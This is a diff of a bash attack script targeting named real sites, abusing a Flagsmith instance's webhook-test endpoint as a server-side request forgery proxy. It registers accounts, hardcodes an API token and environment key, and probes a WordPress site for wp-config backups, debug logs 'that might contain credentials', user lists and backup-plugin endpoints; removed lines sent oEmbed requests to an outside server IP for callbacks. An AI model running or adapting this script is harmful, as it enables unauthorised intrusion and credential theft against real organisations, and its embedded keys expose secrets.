@@ -1,44 +1,69 @@
 #!/bin/bash
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-KEY="5c835df901f2674a0788e25484a73eb42be31713"
-EKEY="8uLGCkxcX7sfS5GDFvy3Ah"
+
+# Register FRESH Flagsmith account (v4 account may be rate limited)
+ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
+  -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Accept: application/json" \
+  -d '{"email":"kw-v7-test@proton.me","password":"Xk9mPw3nRt7v!","first_name":"V","last_name":"7"}' --max-time 15)
+KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
+echo "Key: $KEY"
+
+if [ -z "$KEY" ]; then
+  KEY="5c835df901f2674a0788e25484a73eb42be31713"
+  EKEY="8uLGCkxcX7sfS5GDFvy3Ah"
+  echo "Using existing account"
+else
+  # Setup org/project/env
+  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
+    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+    -d '{"name":"v7"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
+    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+    -d "{\"name\":\"v\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
+    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+    -d "{\"name\":\"v\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
+  echo "Env: $EKEY"
+fi
 
 SSRF() {
   curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
     -H "User-Agent: $UA" -H "Accept: application/json" \
-    -H "Referer: https://flagsmith.koinworks.com/" \
     -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
 }
 
-echo "IP: $(curl -s https://ifconfig.me)"
-
-# Test 1: WP oEmbed SSRF (parse-embed fetches URL server-side)
-echo "=== OEMBED SSRF TO VPS ==="
-SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=parse-embed&post=1&shortcode=%5Bembed%5Dhttp%3A%2F%2F64.227.62.83%3A8888%2Foembed-ssrf%5B%2Fembed%5D"
+# Test 1: WP REST API with Basic Auth (common password patterns)
+echo "=== WP REST AUTH TEST ==="
+# Test if WP application passwords are enabled
+SSRF "https://koinp2p.com/wp-json/wp/v2/users/me"
 echo ""
 
-# Test 2: WP REST API oembed proxy  
-echo "=== REST OEMBED ==="
-SSRF "https://koinp2p.com/wp-json/oembed/1.0/proxy?url=http%3A%2F%2F64.227.62.83%3A8888%2Frest-oembed"
+# Test 2: WP debug.log (might contain credentials)
+echo "=== WP DEBUG LOG ==="
+SSRF "https://koinp2p.com/wp-content/debug.log"
 echo ""
 
-# Test 3: WP oEmbed discover (fetches URL to find oembed endpoint)
-echo "=== OEMBED DISCOVER ==="
-SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=parse-embed&url=http%3A%2F%2F64.227.62.83%3A8888%2Foembed-discover"
+# Test 3: WP backup files
+echo "=== WP-CONFIG BACKUP ==="
+SSRF "https://koinp2p.com/wp-config.php.bak"
+echo ""
+SSRF "https://koinp2p.com/wp-config.php~"
+echo ""
+SSRF "https://koinp2p.com/wp-config.php.old"
 echo ""
 
-# Test 4: Direct admin-ajax SSRF actions
-echo "=== WP CRON ==="
-SSRF "https://koinp2p.com/wp-cron.php?doing_wp_cron=1"
+# Test 4: WP Code Snippets REST API (might be accessible)
+echo "=== CODE SNIPPETS ==="
+SSRF "https://koinp2p.com/wp-json/code-snippets/v1/snippets"
 echo ""
 
-# Test 5: wp-json users (info disclosure)
-echo "=== WP USERS ==="
-SSRF "https://koinp2p.com/wp-json/wp/v2/users"
+# Test 5: Really Simple SSL API
+echo "=== RSSSL ==="
+SSRF "https://koinp2p.com/wp-json/reallysimplessl/v1/tests"
 echo ""
 
-# Test 6: wp-json plugins (if accessible)
-echo "=== WP PLUGINS ==="
-SSRF "https://koinp2p.com/wp-json/wp/v2/plugins"
+# Test 6: UpdraftPlus REST API  
+echo "=== UPDRAFT REST ==="
+SSRF "https://koinp2p.com/wp-json/updraftplus/v1/backup"
 echo ""
